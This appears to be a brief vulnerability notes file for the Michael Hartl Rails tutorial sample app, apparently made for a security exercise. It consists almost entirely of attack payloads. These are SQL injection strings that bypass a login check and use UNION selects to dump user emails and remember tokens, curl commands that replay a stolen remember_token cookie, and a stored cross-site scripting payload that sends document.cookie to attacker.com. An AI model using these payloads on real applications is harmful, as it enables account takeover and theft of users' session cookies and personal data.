# Michael Hartl Sample App + Security Vulnerabilities
=====================================================

SQL injection
-------------
* a' ) or 1 = 1  --  
* XXX') union select 1, email, 1, 1, 1 from users --  
* XXX') union select 1, remember_token, 1, 1, 1 from users --  

    curl "http://www.blog.com:3000/" --cookie remember_token=


CSS
---
* Post this
<pre>
    <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
</pre>



XSRF
----
    curl "http://www.blog.com:3000/microposts/7" --cookie remember_token=XXXXXXXX
